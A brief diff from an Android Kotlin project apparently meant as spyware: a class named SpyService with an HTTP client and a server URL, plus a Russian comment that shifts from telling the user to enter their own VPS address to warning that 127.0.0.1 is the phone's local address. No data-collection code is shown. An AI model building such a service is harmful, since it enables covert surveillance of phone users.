@@ -18,8 +18,8 @@ import java.util.concurrent.TimeUnit
 class SpyService : Service() {
     private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
     
-    // ЗАМЕНИ НА СВОЙ IP (VPS или локальный)
-     private val serverUrl = "http://127.0.0.1:8080"
+    // ВНИМАНИЕ: Здесь установлен IP 127.0.0.1 (локальный адрес телефона)
+    private val serverUrl = "http://127.0.0.1:8080" 
 
     override fun onCreate() {
         super.onCreate()
